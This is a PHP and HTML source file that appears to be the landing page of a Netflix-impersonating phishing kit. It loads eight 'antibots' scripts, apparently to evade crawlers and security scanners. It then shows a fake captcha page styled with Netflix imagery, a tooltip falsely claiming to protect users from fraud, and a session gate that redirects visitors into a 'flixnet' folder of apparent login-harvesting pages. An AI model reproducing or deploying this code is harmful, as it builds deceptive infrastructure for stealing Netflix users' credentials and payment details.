<?php
/* 
#############################################################################################################################################
#                                                                                                                                           #                                                                                                     
#   #####################################################################################################################################   #                                                                                                                  
#   #      $$$$$$$$$$        $$$$$$$$        $$       $$      $$$$$$$$$$$     $$$$$$$$     $$$$$$$      $$$$$$$$$$$ $$$        $$$      #   #         
#   #      $$        $$      $$               $$     $$           $$$         $$           $$     $         $$$     $$$$       $$$      #   #  
#   #      $$         $$     $$                $$   $$            $$$         $$           $$     $$        $$$     $$$ $$     $$$      #   #   
#   #      $$         $$     $$                 $$$$              $$$         $$           $$$$$$$$         $$$     $$$  $$    $$$      #   #
#   #      $$         $$     $$$$$$$$           $ $$              $$$         $$$$$$$$     $$   $$          $$$     $$$   $$   $$$      #   #            
#   #      $$        $$      $$                $$   $$            $$$         $$           $$    $$         $$$     $$$    $$  $$$      #   # 
#   #      $$       $$       $$               $$     $$           $$$         $$           $$     $$        $$$     $$$     $$ $$$      #   #   
#   #      $$$$$$$$$         $$$$$$$$        $$       $$          $$$         $$$$$$$$     $$      $$ $$$$$ $$$     $$$        $$$      #   #         
#   #####################################################################################################################################   #                                                                                                                 
#                                                                                                                                           #
#############################################################################################################################################    
*/
session_start();
error_reporting(0);
include('flixnet/antibots/anti1.php');
include('flixnet/antibots/anti2.php');
include('flixnet/antibots/anti3.php');
include('flixnet/antibots/anti4.php');
include('flixnet/antibots/anti5.php');
include('flixnet/antibots/anti6.php');
include('flixnet/antibots/anti7.php');
include('flixnet/antibots/anti8.php');

if(isset($_GET["pp"]) && $_GET["pp"] == "2300"){
session_start();
$_SESSION["good"] = "okito";
header("location:flixnet");
}
?>
<html>
<title>Captcha verification</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="flixnet/assets/nficon2016.png">
<style>
body{
background-color:rgba(0, 0, 0, 0.5);
background-image: url("https://assets.nflxext.com/ffe/siteui/vlv3/3b48f428-24ed-4692-bb04-bc7771854131/087be50f-41d9-44bb-842b-8ddb05e1d4da/US-en-20200302-popsignuptwoweeks-perspective_alpha_website_medium.jpg");
}
.img{
width: 22%;
height: 12%;
margin-bottom: 3%;
	margin-top: 5%;
}
.tooltip {
  position: relative;
  display: inline-block;
  border-bottom: 1px solid lightgrey;
  font-family: Cambria, "Hoefler Text", "Liberation Serif", Times, "Times New Roman", "serif";
}

.tooltip .tooltiptext {
  visibility: hidden;
  width: 120px;
  background-color: black;
  color: white;
  text-align: center;
  border-radius: 6px;
  padding: 5px 0;

  /* Position the tooltip */
  position: absolute;
  z-index: 1;
  bottom: 100%;
  left: 50%;
  margin-left: -60px;
}

.tooltip:hover .tooltiptext {
  visibility: visible;
}
	#recp{
		background-color: white;
		width:24%;
		padding-top:0.5%;
		padding-bottom: 0.5%;
	}
@media only screen and (max-width: 600px) {
	body{
		background-position: 75% 100%;
	}
.img{
width: 22%;
height: 30%;
background-image: inherit;
}
	#recp{
		border:none;
		width:100%;
		padding-top:none;
		padding-bottom:none;


	}
}
</style>
	<link rel="stylesheet" href="flixnet/css/log.css"/>
<script src='https://www.google.com/recaptcha/api.js'></script>
<div id="dour" class="transitioning hide"><p id="flkhr" class="secureMessage hide">Redirecting...</p></div>
<center>
<div class="div">
<img src="flixnet/assets/nff.svg" class="img" title="Logo"/><br><br>
<div id="recp" class="g-recaptcha" data-sitekey="6Lf-GsUZAAAAALLGjBMfN-7DVgtmzWBgLpzbHAmp" data-callback="correctCaptcha"></div><br><br>
<br><br>
<div class="tooltip" style="color:white">Why this process ?
 <span class="tooltiptext">This is necessary to protect users from fraud.</span>
</div>
<div id="err"></div>
</div>
</center>
<script>
var correctCaptcha = function(response) {
        if(response.length !== 0){
			setTimeout(function(){
			document.getElementById("dour").classList.remove("hide");
			document.getElementById("dour").classList.add("spinner");
			document.getElementById("flkhr").classList.remove("hide");},550)
       setTimeout(function(){window.location.href = "index.php?pp=2300"},700);
         }
        else{ document.getElementById("err").innerHTML = "Google Recaptcha Verification Failed"; };
    };
</script>
</html>